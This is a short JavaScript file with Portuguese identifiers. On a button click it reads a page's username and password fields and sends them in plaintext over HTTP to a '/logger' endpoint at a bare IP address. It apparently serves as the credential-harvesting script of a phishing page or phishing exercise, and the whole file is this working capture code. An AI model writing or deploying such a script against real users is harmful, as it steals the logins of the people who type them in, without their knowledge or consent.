var botao = document.querySelector(".botao");

botao.addEventListener("click", ()=>{
	var user = document.querySelector(".usuario").value;
	var pass = document.querySelector(".senha").value;
	
	fetch("http://10.11.71.30:8080/logger",{
				
					method: "POST",
					
					headers:{
						"Content-Type": "application/json",
						},
					
					body: JSON.stringify({
						username: user,
						password: pass
						})
					}).catch((error)=>{
						alert(error);
					});
				});